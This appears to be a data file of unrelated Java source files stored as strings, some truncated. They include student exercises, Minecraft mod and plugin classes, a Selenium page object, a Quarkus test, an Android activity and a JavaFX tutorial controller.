    "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"Ol\u00e1 e seja bem-vindo ao nosso gerente de produto!\");\n\n        GerenciadorDeProdutos gerenciador = new GerenciadorDeProdutos();\n\n        // Adicionar produtos\n        gerenciador.adicionarProduto(new Produto(1, \"Caneta\", 1.50));\n        gerenciador.adicionarProduto(new Produto(2, \"L\u00e1pis\", 0.75));\n        gerenciador.adicionarProduto(new Produto(3, \"Caderno\", 5.90));\n\n        // Listar produtos\n        System.out.println(\"\\nLista de produtos:\");\n        for (Produto produto : gerenciador.listarProdutos()) {\n            System.out.println(produto);\n        }\n\n        // Atualizar produto\n        gerenciador.atualizarProduto(1, new Produto(2, \"L\u00e1pis Grafite\", 1.00));\n        System.out.println(\"\\nAp\u00f3s atualiza\u00e7\u00e3o:\");\n        for (Produto produto : gerenciador.listarProdutos()) {\n            System.out.println(produto);\n        }\n\n        // Deletar produto\n        gerenciador.deletarProduto(0);\n        System.out.println(\"\\nAp\u00f3s remo\u00e7\u00e3o:\");\n        for (Produto produto : gerenciador.listarProdutos()) {\n            System.out.println(produto);\n        }\n    }\n}\n",
    "package top.infsky.cheatdetector.anticheat;\n\nimport lombok.Getter;\nimport net.minecraft.client.Minecraft;\nimport net.minecraft.client.player.AbstractClientPlayer;\nimport net.minecraft.world.effect.MobEffects;\nimport net.minecraft.world.phys.Vec3;\nimport org.jetbrains.annotations.NotNull;\nimport org.jetbrains.annotations.Range;\nimport top.infsky.cheatdetector.CheatDetector;\nimport top.infsky.cheatdetector.anticheat.utils.TimeTaskManager;\n\nimport java.util.LinkedList;\nimport java.util.List;\n\n/**\n * \u7ba1\u7406\u73a9\u5bb6\u4fe1\u606f\u7684\u7c7b\u3002\u6bcf\u4e2a\u73a9\u5bb6\u90fd\u5e94\u6709\u4e00\u4e2aTRPlayer\u5b9e\u4f8b\u3002\n */\n@Getter\npublic class TRPlayer {\n    public AbstractClientPlayer fabricPlayer;\n    public CheckManager manager;\n    public static Minecraft CLIENT = CheatDetector.CLIENT;\n\n    public Vec3 currentPos;\n    public Vec3 lastPos;\n    @Range(from = 0, to = 19) public List<Vec3> posHistory;\n    public Vec3 lastOnGroundPos;\n    public Vec3 lastInLiquidPos;\n    public Vec3 lastOnLiquidGroundPos;\n    public boolean lastOnGround;\n    public boolean hasSetback = false;\n    public boolean jumping = false;\n    public boolean lastUsingItem = false;\n    public double speedMul = 1;\n\n    public TimeTaskManager timeTask = new TimeTaskManager();\n\n    public TRPlayer(@NotNull AbstractClientPlayer player) {\n        this.fabricPlayer = player;\n        this.manager = CheckManager.create(this);\n        currentPos = fabricPlayer.position();\n        lastOnGround = fabricPlayer.onGround();\n        posHistory = new LinkedList<>();\n        for (int i = 0; i < 20; i++) {\n            posHistory.add(currentPos);\n        }\n    }\n\n    public void update(AbstractClientPlayer player) {\n        fabricPlayer = player;\n        if (fabricPlayer == null) return;\n\n        currentPos = fabricPlayer.position();\n        speedMul = fabricPlayer.getActiveEffectsMap().containsKey(MobEffects.MOVEMENT_SPEED)\n                ? fabricPlayer.getActiveEffectsMap().get(MobEffects.MOVEMENT_SPEED).getAmplifier() * 0.2 + 1\n                : 1;\n        speedMul *= fabricPlayer.getSpeed() * 10;  // IDK why, but it just works!\n        updatePoses();\n        if (fabricPlayer.onGround()) {\n            lastOnGroundPos = currentPos;\n            jumping = false;\n            if (fabricPlayer.isInWater())\n                lastOnLiquidGroundPos = currentPos;\n        }\n        if (fabricPlayer.isInWater() || fabricPlayer.isInLava()) {\n            lastInLiquidPos = currentPos;\n        }\n        timeTask.onTick();\n\n        manager.update();\n\n        lastPos = currentPos;\n        lastOnGround = fabricPlayer.onGround();\n        lastUsingItem = fabricPlayer.isUsingItem();\n    }\n\n    private void updatePoses() {\n        if (posHistory.size() >= 20) {\n            posHistory.remove(posHistory.size() - 1);\n        }\n        posHistory.add(0, currentPos);\n    }\n}\n",
    "package com.tofa.islobby.config.event;\n\nimport io.papermc.paper.event.player.AsyncChatEvent;\nimport org.bukkit.event.Cancellable;\nimport org.bukkit.event.Event;\nimport org.bukkit.event.EventException;\nimport org.bukkit.event.Listener;\nimport org.bukkit.event.entity.CreatureSpawnEvent;\nimport org.bukkit.event.entity.EntityDamageByEntityEvent;\nimport org.bukkit.event.entity.EntityDamageEvent;\nimport org.bukkit.event.entity.FoodLevelChangeEvent;\nimport org.jetbrains.annotations.NotNull;\n\npublic enum EventType implements EventFilter {\n    ENTITY_DAMAGE(EntityDamageEvent.class),\n    PVP(EntityDamageByEntityEvent.class),\n    HUNGER(FoodLevelChangeEvent.class),\n    CHAT(AsyncChatEvent.class),\n    MOB_SPAWNING(CreatureSpawnEvent.class);\n\n    EventType(Class<? extends Event> clazz) {\n        this.clazz = clazz;\n    }\n\n    private final Class<? extends Event> clazz;\n\n    @Override\n    public void execute(@NotNull Listener listener, @NotNull Event event) throws EventException {\n        if(clazz.isAssignableFrom(event.getClass()) && event instanceof Cancellable) {\n            Cancellable cancellableEvent = (Cancellable) event;\n            cancellableEvent.setCancelled(true);\n        }\n    }\n\n    @Override\n    public Class<? extends Event> eventClass() {\n        return clazz;\n    }\n}\n",
    "package US_501;\n\nimport Utility.BaseDriver;\nimport org.openqa.selenium.WebElement;\nimport org.openqa.selenium.support.FindBy;\nimport org.openqa.selenium.support.PageFactory;\n\npublic class Register_Elements {\n    public Register_Elements() {\n        PageFactory.initElements(BaseDriver.driver, this);\n    }\n\n    @FindBy(xpath = \"//a[@class='ico-register']\")\n    public WebElement register;\n\n    @FindBy(xpath = \"//input[@id='gender-female']\")\n    public WebElement radioButton;\n\n    @FindBy(xpath = \"//input[@id='FirstName']\")\n    public WebElement firstName;\n\n    @FindBy(css = \"input[id='LastName']\")\n    public WebElement lastName;\n\n    @FindBy(xpath = \"//select[contains(@name,'Day')]\")\n    public WebElement dateOfBirthDay;\n\n    @FindBy(css = \"[name*='Month']\")\n    public WebElement dateOfBirthMonth;\n\n    @FindBy(xpath = \"//*[@name='DateOfBirthYear']\")\n    public WebElement dateOfBirthYear;\n\n    @FindBy(css = \"[id='Email']\")\n    public WebElement email;\n\n    @FindBy(xpath = \"//input[@id='Company']\")\n    public WebElement companyName;\n\n    @FindBy(xpath = \"//input[@id='Password']\")\n    public WebElement password;\n\n    @FindBy(xpath = \"//input[@id='ConfirmPassword']\")\n    public WebElement confirmPassword;\n\n    @FindBy(css = \"[id='register-button']\")\n    public WebElement registerButton;\n\n    @FindBy(xpath = \"//div[@class='result']\")\n    public WebElement resultText;\n\n    @FindBy(xpath = \"//a[@class='button-1 register-continue-button']\")\n    public WebElement registerContinueButton;\n\n\n}\n",
    "package io.quarkiverse.antora.test;\n\nimport static io.restassured.RestAssured.given;\n\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.UUID;\nimport java.util.concurrent.TimeUnit;\n\nimport org.awaitility.Awaitility;\nimport org.hamcrest.CoreMatchers;\nimport org.junit.jupiter.api.Test;\n\nimport io.restassured.RestAssured;\nimport io.restassured.http.ContentType;\nimport io.restassured.response.ValidatableResponse;\n\npublic class AntoraDevModeTest {\n\n    @Test\n    public void edit() throws InterruptedException, IOException {\n\n        final Path baseDir = Path.of(\".\").toAbsolutePath().normalize();\n        try (DevModeProcess devMode = new DevModeProcess(baseDir)) {\n            {\n                final ValidatableResponse response = Awaitility.await().atMost(10, TimeUnit.SECONDS).until(\n                        () -> {\n                            try {\n                                return RestAssured\n                                        .given()\n                                        .contentType(ContentType.HTML)\n                                        .get(\"http://localhost:8080/antora/quarkus-antora/dev/index.html\")\n                                        .then();\n                            } catch (Exception e) {\n                                /* The reload of the service takes some time */\n                                return null;\n                            }\n                        },\n                        resp -> resp != null && resp.extract().statusCode() == 200);\n                response\n                        .body(CoreMatchers.containsString(\"<h1 class=\\\"page\\\">Quarkus Antora</h1>\"));\n            }\n\n            /* Make sure new.adoc does not exist yet */\n            RestAssured\n                    .given()\n                    .contentType(ContentType.HTML)\n                    .get(\"http://localhost:8080/antora/quarkus-antora/dev/new.html\")\n                    .then()\n                    .statusCode(404);\n\n            /* Add new.adoc */\n            Path newFile = baseDir.resolve(\"modules/ROOT/pages/new.adoc\");\n            String uniqueContent = UUID.randomUUID().toString();\n            try {\n                Files.writeString(newFile, \"= New Page\\n\\n\" + uniqueContent, StandardCharsets.UTF_8);\n                {\n                    final ValidatableResponse response = Awaitility.await().atMost(10, TimeUnit.SECONDS).until(\n                            () -> {\n                                try {\n                                    return RestAssured\n                                            .given()\n                                            .contentType(ContentType.HTML)\n                                            .get(\"http://localhost:8080/antora/quarkus-antora/dev/new.html\")\n                                            .then();\n                                } catch (Exception e) {\n                                    /* The reload of the service takes some time */\n                                    return null;\n                                }\n                            },\n                            resp -> resp != null && resp.extract().statusCode() == 200);\n                    response.body(CoreMatchers.containsString(uniqueContent));\n                }\n\n                /* Add an invalid link to new.adoc */\n                Files.writeString(newFile, \"= New Page\\n\\nxref:non-existent-page.adoc[non-existent]\", StandardCharsets.UTF_8);\n                {\n                    final ValidatableResponse response = Awaitility.await().atMost(10, TimeUnit.SECONDS).until(\n                            () -> {\n                                try {\n                                    return RestAssured\n                                            .given()\n                                            .contentType(ContentType.HTML)\n                                            .get(\"http://localhost:8080/antora/quarkus-antora/dev/new.html\")\n                                            .then();\n                                } catch (Exception e) {\n                                    /* The reload of the service takes some time */\n                                    return null;\n                                }\n                            },\n                            resp -> resp != null && resp.extract().statusCode() == 500);\n                    response.body(CoreMatchers.containsString(\"target of xref not found: non-existent-page.adoc\"));\n                }\n\n                /* Fix it */\n                Files.writeString(newFile, \"= New Page\\n\\n\" + uniqueContent, StandardCharsets.UTF_8);\n                {\n                    final ValidatableResponse response = Awaitility.await().atMost(10, TimeUnit.SECONDS).until(\n                            () -> {\n                                try {\n                                    return RestAssured\n                                            .given()\n                       ",
    "import java.util.Scanner;\r\n\r\npublic class Q9 {\r\n\r\n\tpublic static void main(String[] args) {\r\n\t\t// TODO Auto-generated method stub\r\n\t\tScanner obj = new Scanner(System.in);\r\n        System.out.println(\"Enter any Sentence:\");\r\n        String a = obj.nextLine();\r\n        System.out.println(\"Enter any two words:\");\r\n        String b = obj.nextLine();\r\n        String c = obj.nextLine();\r\n        int firstIndex = a.indexOf(b); \r\n        System.out.println(\"First occurrence of word \" + b + \" is found at index : \" + firstIndex); \r\n        if (firstIndex != -2)\r\n        {\r\n            // Replace the word using substring operations and concatenation\r\n            String modifiedSentence = a.substring(0, firstIndex) + c + a.substring(firstIndex + b.length());\r\n            System.out.println(\"Original Sentence: \" + a);\r\n            System.out.println(\"Modified Sentence: \" + modifiedSentence);\r\n        } \r\n        else \r\n        {\r\n            System.out.println(\"Word '\" + b + \"' not found in the sentence.\");\r\n        }\r\n\r\n\r\n\t}\r\n\r\n}\r\n",
    "package com.dsa;\r\nimport  java.util.Scanner;\r\n\r\npublic class conditionals {\r\n    //to print max no. among 3\r\n    public static void main(String[] args) {\r\n//        int a= 23;\r\n//        int b = 43;\r\n//        int c = 56;\r\n//        int max = a;\r\n//        if (b>max){\r\n//            max = b;\r\n//\r\n//        }\r\n//        if (c>max) {\r\n//            max = c;\r\n//\r\n//        }\r\n//        System.out.println(max);\r\n\r\n        // to check wheater char is a capital or not\r\n\r\n//        Scanner sc = new Scanner(System.in);\r\n////        char a = sc.next().trim().charAt(0);\r\n////        if(char >= 'a' && char <= 'z'){\r\n////            System.out.println(\"capital\");\r\n////        }\r\n////        else{\r\n////            System.out.println(\"short\");\r\n////\r\n////        }\r\n//        char a = sc.next().trim().charAt(0);\r\n//        if (a >= 'a' && a <= 'z') {\r\n//            System.out.println(\"capital\");\r\n//\r\n//        } else {\r\n//            System.out.println(\"short\");\r\n////\r\n////\r\n//        }\r\n\r\n\r\n\r\n\r\n//        //fibonnacci series\r\n//         int a = 0;\r\n//         int b = 1;\r\n//         int c;\r\n//         int n = 10;\r\n//        System.out.println(a);\r\n//        System.out.println(b);\r\n//\r\n//         while (n>0){\r\n//             c=a+b;\r\n//             System.out.println(c);\r\n//             a=b;\r\n//             b=c;\r\n//             n--;\r\n//\r\n//         }\r\n\r\n\r\n\r\n//        //to check how many times a number 7 is occuring in integer\r\n//        int a =145788777;\r\n//        int c=0;\r\n//        while(a>1){\r\n//\r\n//            int b = a%10;\r\n//\r\n//\r\n//            if(b==7){\r\n//                c++;\r\n//            }\r\n//            a = a/10;\r\n//        }\r\n//        System.out.println(c);\r\n\r\n        // to reverse the number\r\n        int a = 1234567;\r\n        int b = 0;\r\n        int c;\r\n\r\n        while(a>0){\r\n\r\n            c = a%10;\r\n            a=a/10;\r\n            b = b*10 + c;\r\n\r\n\r\n\r\n        }\r\n        System.out.println(b);\r\n\r\n    }\r\n}\r\n\r\n",
    "package duperez.moresigns.common.registry;\n\nimport net.minecraft.world.food.FoodProperties;\nimport net.minecraft.world.item.Item;\nimport net.minecraft.world.item.Items;\nimport net.minecraft.world.item.SignItem;\nimport net.minecraftforge.registries.DeferredRegister;\nimport net.minecraftforge.registries.ForgeRegistries;\nimport net.minecraftforge.registries.RegistryObject;\nimport duperez.moresigns.MoreSigns;\n\n@SuppressWarnings(\"unused\")\npublic class ModItems {\n    public static final DeferredRegister<Item> ITEMS = DeferredRegister.create(ForgeRegistries.ITEMS, MoreSigns.MODID);\n\n    // Helper methods\n    public static Item.Properties basicItem() {\n        return new Item.Properties().tab(MoreSigns.CREATIVE_TAB);\n    }\n\n    public static Item.Properties foodItem(FoodProperties food) {\n        return new Item.Properties().food(food).tab(MoreSigns.CREATIVE_TAB);\n    }\n\n    public static Item.Properties bowlFoodItem(FoodProperties food) {\n        return new Item.Properties().food(food).craftRemainder(Items.BOWL).stacksTo(16).tab(MoreSigns.CREATIVE_TAB);\n    }\n\n    public static Item.Properties drinkItem() {\n        return new Item.Properties().craftRemainder(Items.GLASS_BOTTLE).stacksTo(16).tab(MoreSigns.CREATIVE_TAB);\n    }\n\n    public static final RegistryObject<Item> CANVAS_SIGN = ITEMS.register(\"canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.CANVAS_SIGN.get(), ModBlocks.CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> WHITE_CANVAS_SIGN = ITEMS.register(\"white_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.WHITE_CANVAS_SIGN.get(), ModBlocks.WHITE_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> ORANGE_CANVAS_SIGN = ITEMS.register(\"orange_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.ORANGE_CANVAS_SIGN.get(), ModBlocks.ORANGE_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> MAGENTA_CANVAS_SIGN = ITEMS.register(\"magenta_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.MAGENTA_CANVAS_SIGN.get(), ModBlocks.MAGENTA_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> LIGHT_BLUE_CANVAS_SIGN = ITEMS.register(\"light_blue_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.LIGHT_BLUE_CANVAS_SIGN.get(), ModBlocks.LIGHT_BLUE_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> YELLOW_CANVAS_SIGN = ITEMS.register(\"yellow_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.YELLOW_CANVAS_SIGN.get(), ModBlocks.YELLOW_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> LIME_CANVAS_SIGN = ITEMS.register(\"lime_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.LIME_CANVAS_SIGN.get(), ModBlocks.LIME_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> PINK_CANVAS_SIGN = ITEMS.register(\"pink_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.PINK_CANVAS_SIGN.get(), ModBlocks.PINK_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> GRAY_CANVAS_SIGN = ITEMS.register(\"gray_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.GRAY_CANVAS_SIGN.get(), ModBlocks.GRAY_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> LIGHT_GRAY_CANVAS_SIGN = ITEMS.register(\"light_gray_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.LIGHT_GRAY_CANVAS_SIGN.get(), ModBlocks.LIGHT_GRAY_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> CYAN_CANVAS_SIGN = ITEMS.register(\"cyan_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.CYAN_CANVAS_SIGN.get(), ModBlocks.CYAN_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> PURPLE_CANVAS_SIGN = ITEMS.register(\"purple_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.PURPLE_CANVAS_SIGN.get(), ModBlocks.PURPLE_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> BLUE_CANVAS_SIGN = ITEMS.register(\"blue_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.BLUE_CANVAS_SIGN.get(), ModBlocks.BLUE_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> BROWN_CANVAS_SIGN = ITEMS.register(\"brown_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.BROWN_CANVAS_SIGN.get(), ModBlocks.BROWN_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> GREEN_CANVAS_SIGN = ITEMS.register(\"green_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.GREEN_CANVAS_SIGN.get(), ModBlocks.GREEN_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> RED_CANVAS_SIGN = ITEMS.register(\"red_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.RED_CANVAS_SIGN.get(), ModBlocks.RED_CANVAS_WALL_SIGN.get()));\n    public static final RegistryObject<Item> BLACK_CANVAS_SIGN = ITEMS.register(\"black_canvas_sign\",\n            () -> new SignItem(basicItem(), ModBlocks.BLACK_CANVAS_SIGN.get(), ModBlocks.BLACK_CANVA",
    "import java.util.Scanner;\r\nimport java.io.IOException;\r\nimport java.util.Random;\r\npublic class Lotofacil {\r\n\r\n    public static void main(String[] args) {\r\n       Scanner scanner = new Scanner(System.in);\r\n         int opcoesMenu;\r\n\r\n\r\n         System.out.println(\"*****************\");\r\n            System.out.println(\"Menu LOTOFACIL:\");\r\n            System.out.println(\"1) Apostar de 0 a 100\");\r\n            System.out.println(\"2) Apostar de A a Z\");\r\n            System.out.println(\"3) Apostar em par ou impar\");\r\n            System.out.println(\"0) Sair\");\r\n            System.out.println(\"*****************\");\r\n            System.out.print(\"Escolha uma opcao: \");\r\n            \r\n       do {\r\n                opcoesMenu = scanner.nextInt();\r\n\r\n                    switch (opcoesMenu) {\r\n                \r\n                case 1:\r\n                    System.out.println(\"*******************\");\r\n                    System.out.println(\"Jogo escolhido:\");\r\n                    System.out.println(\"Apostar de 0 a 100\");\r\n                    System.out.println(\"*******************\");\r\n                    Scanner meuNumero = new Scanner(System.in);\r\n                        System.out.println(\"Digite o seu numero de aposta: \");\r\n                        int numeroInformado = meuNumero.nextInt();\r\n                        if (numeroInformado < 0 || numeroInformado > 100) {\r\n                            System.out.println(\"Aposta invalida. O numero deve estar entre 0 e 100!\");\r\n                            System.out.println(\"Digite 0 para sair ou 1 para jogar novamente.\");\r\n                            }else {\r\n                                Random gerador = new Random();\r\n                                int numeroSorteado = gerador.nextInt(100);\r\n                                System.out.println(\"O seu numero digitado foi: \" + numeroInformado);\r\n                                System.out.println(\"O numero sorteado e: \" + numeroSorteado);\r\n                                    if (numeroInformado == numeroSorteado) {\r\n                                        System.out.println(\"Parabens! Voce acertou e ganhou R$1.000,00\");\r\n                                    }else {\r\n                                        System.out.println(\"Que pena! Voce errou!\");\r\n                                    }\r\n                                System.out.println(\"Digite 0 para sair.\");\r\n                            }\r\n                    break;\r\n                \r\n                case 2:\r\n                    System.out.println(\"*******************\");\r\n                    System.out.println(\"Jogo escolhido:\");\r\n                    System.out.println(\"Apostar de A a Z\");\r\n                    System.out.println(\"*******************\");\r\n                    System.out.println(\"Digite uma letra de A a Z: \");   \r\n                    char letraPremiada = 'G';\r\n                    try {\r\n                        int codigoAscii = System.in.read();\r\n                        char letraAposta = Character.toUpperCase((char) codigoAscii);\r\n                        System.out.println(\"A letra apostada foi:\" + \" \" + letraAposta);\r\n                        if (Character.isLetter(letraAposta)) {\r\n                            if (letraAposta == letraPremiada) {\r\n                                System.out.println(\"Voce ganhou R$ 500,00 reais.\");\r\n                            }else {\r\n                                System.out.println(\"Que pena! A letra sorteada foi: \" + letraPremiada);\r\n                            }\r\n                        }else {\r\n                            System.out.println(\"Aposta inv\u00e1lida. Digite uma letra de A a Z.\");\r\n                        }\r\n                    } catch (IOException e) {\r\n                        System.out.println(\"Erro ao ler a entrada.\");\r\n                        e.printStackTrace();\r\n                    }\r\n                    \r\n                break;\r\n                \r\n                case 3:\r\n                    System.out.println(\"*******************\");\r\n                    System.out.println(\"Jogo escolhido:\");\r\n                    System.out.println(\"Apostar em par ou impar\");\r\n                    System.out.println(\"*******************\");\r\n                    Scanner parOuImpar = new Scanner(System.in);\r\n                    System.out.println(\"Digite um numero: \");\r\n                    int nParOuImpar = parOuImpar.nextInt();\r\n                    if (nParOuImpar % 2 == 0) {\r\n                        System.out.println(\"O numero \" + nParOuImpar + \" e par.\");\r\n                        System.out.println(\"Parabens. Voce ganhou R$100,00\");\r\n                        }else {\r\n                            System.out.println(\"O numero \" + nParOuImpar + \" e impar.\");\r\n                            System.out.println(\"Que pena, voce perdeu. A premiacao era apenas para numeros pares.\");\r\n                            System.out.println(\"Digite 0 para sair.\");\r\n                        }\r\n\r\n\r\n                    break;\r\n                case 0:\r\n        ",
    "package recursive;\r\n\r\npublic class LinearProbing {\r\n    private static final int TABLE_SIZE = 7;\r\n    private int[] table;\r\n\r\n    public LinearProbing() {\r\n        table = new int[TABLE_SIZE];\r\n        for (int i = 0; i < TABLE_SIZE; i++) {\r\n            table[i] = -1; \r\n        }\r\n    }\r\n\r\n    \r\n    private int hash(int key) {\r\n        return key % TABLE_SIZE;\r\n    }\r\n\r\n    \r\n    public void insert(int key) {\r\n        int index = hash(key);\r\n        int originalIndex = index;\r\n        do {\r\n            if (table[index] == -1) {\r\n                table[index] = key;\r\n                return;\r\n            }\r\n            index = (index + 1) % TABLE_SIZE; // Linear probing\r\n        } while (index != originalIndex); // Stop if we've checked all slots\r\n        System.out.println(\"Table is full. Cannot insert \" + key);\r\n    }\r\n\r\n    // Display the hash table\r\n    public void display() {\r\n        System.out.println(\"Hash Table:\");\r\n        System.out.println();\r\n        for (int i = 0; i < TABLE_SIZE; i++) {\r\n            System.out.println( i + \"  -->> \" + table[i]);\r\n        }\r\n    }\r\n\r\n    public static void main(String[] args) {\r\n        int[] numbers = {50, 700, 76, 85, 92, 73, 101};\r\n        LinearProbing linearProbing = new LinearProbing();\r\n\r\n        for (int num : numbers) {\r\n            linearProbing.insert(num);\r\n        }\r\n\r\n        linearProbing.display();\r\n    }\r\n}\r\n\r\n",
    "package com.example.oxynews2;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport android.os.Bundle;\nimport android.util.Log;\n\nimport java.io.BufferedReader;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\n\npublic class MainActivity extends AppCompatActivity {\n    String MY_FILE_NAME;\n    ArrayList<ArticleData> articleArr = new ArrayList<ArticleData>();\n\n    public String readTextFile(){\n        MY_FILE_NAME = \".txt\";\n        File path = getApplicationContext().getFilesDir();\n        File readFrom = new File(path, MY_FILE_NAME);\n        byte[] content = new byte[(int) readFrom.length()];\n        try{\n            FileInputStream fileis = new FileInputStream(readFrom);\n            fileis.read(content);\n            String stringContent = new String(content);\n\n            Log.i(\"XXX\", stringContent);\n            return stringContent;\n        } catch(Exception e){\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public void readTsvFile(){\n        try(InputStream stream = getResources().openRawResource(R.raw.test)){\n            BufferedReader reader = new BufferedReader(new InputStreamReader(stream, StandardCharsets.UTF_8));\n\n            int lineCounter = 0;\n            String line;\n            while((line = reader.readLine()) != null) {\n                if (lineCounter >= 1) {\n                    String[] words = line.split(\"\\t\");\n\n                    ArticleData article = new ArticleData(words);\n                    articleArr.add(article);\n                }\n                lineCounter++;\n            }\n        } catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        readTsvFile();\n        for(ArticleData article: articleArr){\n            Log.i(\"XXX\", article.getTitle());\n            Log.i(\"XXX\", article.getAuthor());\n            Log.i(\"XXX\", article.getDate());\n            Log.i(\"XXX\", \"- - - - -\");\n        }\n    }\n}",
    "package com.arcane.arithmetic;\n\nimport javafx.event.ActionEvent;\nimport javafx.event.EventHandler;\nimport javafx.fxml.FXML;\nimport javafx.fxml.FXMLLoader;\nimport javafx.scene.Node;\nimport javafx.scene.Parent;\nimport javafx.scene.Scene;\nimport javafx.scene.control.Button;\nimport javafx.scene.control.Label;\nimport javafx.scene.image.Image;\nimport javafx.scene.image.ImageView;\nimport javafx.scene.layout.AnchorPane;\nimport javafx.scene.paint.Color;\nimport javafx.scene.shape.Circle;\nimport javafx.scene.text.Text;\nimport javafx.scene.text.TextAlignment;\nimport javafx.scene.text.TextFlow;\nimport javafx.stage.Modality;\nimport javafx.stage.Stage;\n\n\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\n/**\n * This is the Tutorial Controller, used for controls and events for the first tutorial scene.\n * \n * @author Candice Williams\n *\n */\npublic class TutorialController {\n    private Stage stage;\n    private Scene scene;\n    @FXML private AnchorPane pane;\n    @FXML private Button backSlide;\n    @FXML private Button nextSlide;\n    @FXML private Button nextImg = new Button();\n    @FXML private Button prevImg = new Button();\n    @FXML private ImageView imageView;\n    @FXML private TextFlow textflow;\n    @FXML private Circle circle1, circle2, circle3;\n    @FXML private Label title, subtitle;\n\n    Color focused = new Color(0.6471, 0.4706, 0.3333, 1.0);\n    Color unfocused = new Color(0.9569, 0.7373, 0.549, 1.0);\n\n    String css = this.getClass().getResource(\"css/tutorial.css\").toExternalForm();\n\n//    public void initialize(){\n//        subtitle.setText(\"Multiple Choice\");\n//        title.setText(\"QuestionType\");\n//        nextImg.setOnAction(fillEvent);\n//\n//    }\n    \n    EventHandler<ActionEvent> fillEvent = new EventHandler<ActionEvent>() {\n        public void handle(ActionEvent e)\n        {\n            try {\n                switchToQuestionTypeFill(e);\n            } catch (IOException ex) {\n                throw new RuntimeException(ex);\n            }\n        }\n    };\n\n    EventHandler<ActionEvent> mcEvent = new EventHandler<ActionEvent>() {\n        public void handle(ActionEvent e)\n        {\n            try {\n                switchToQuestionTypeMC(e);\n            } catch (IOException ex) {\n                throw new RuntimeException(ex);\n            }\n        }\n    };\n\n    EventHandler<ActionEvent> matchEvent = new EventHandler<ActionEvent>() {\n        public void handle(ActionEvent e)\n        {\n            try {\n                switchToQuestionTypeMatching(e);\n            } catch (IOException ex) {\n                throw new RuntimeException(ex);\n            }\n        }\n    };\n\n\n    /**\n     * Initialize the tutorial pop up\n     * @param event the tutorial button is pressed\n     * @throws IOException if error initialising Stage variable\n     */\n    public void startTutorial(ActionEvent event) throws IOException{\n    \tStage window = new Stage();\n    \twindow.initModality(Modality.APPLICATION_MODAL);\n        window.resizableProperty().setValue(Boolean.FALSE);\n        pane = (AnchorPane) FXMLLoader.load(getClass().getResource(\"view/Tutorial_1-1.fxml\"));\n\n        scene = new Scene(pane);\n        scene.getStylesheets().add(css);\n        window.setScene(scene);\n        window.showAndWait();\n\n        nextImg.setOnAction(fillEvent);\n\n    }\n\n    /**\n     * Show Multiple Choice text and image tutorial\n     * @param event mcEvent is initialized\n     * @throws IOException if error initialising Stage variable\n     */\n    public void switchToQuestionTypeMC(ActionEvent event) throws IOException {\n\n        //change text\n        subtitle.setText(\"Multiple Choice\");\n        subtitle.setTextAlignment(TextAlignment.CENTER);\n        Text text = new Text(\"Choose the best answer out of the options provided.\\n\" +\n                \"\\n\" +\n                \"Once you are confident with your answer, hit 'Submit'!\");\n        textflow.getChildren().clear();\n        textflow.getChildren().add(text);\n        textflow.setTextAlignment(TextAlignment.CENTER);\n        //set button behaviour\n        nextImg.setDisable(false);\n        nextImg.setOnAction(fillEvent);\n        prevImg.setDisable(true);\n        //change circle colors\n        circle1.setFill(focused);\n        circle2.setFill(unfocused);\n        circle3.setFill(unfocused);\n        //change image\n        Image image = new Image(new FileInputStream(\"src/main/resources/com/arcane/arithmetic/assets/imgs/MC_Color.png\"));\n        imageView.setImage(image);\n        imageView.setFitHeight(136);\n        imageView.setFitWidth(136);\n\n    }\n    /**\n     * Show Fill in the blanks text and image tutorial\n     * @param event fbEvent is initialized\n     * @throws IOException if error initialising Stage variable\n     */\n    public void switchToQuestionTypeFill(ActionEvent event) throws IOException{\n        //change text\n        subtitle.setText(\"Fill-in-the-Blank\");\n        subtitle.setTextAlignment(TextAlignment.CENTER);\n        Text text = new Text(\"Use your mouse and keyboard to type the correct answers ",
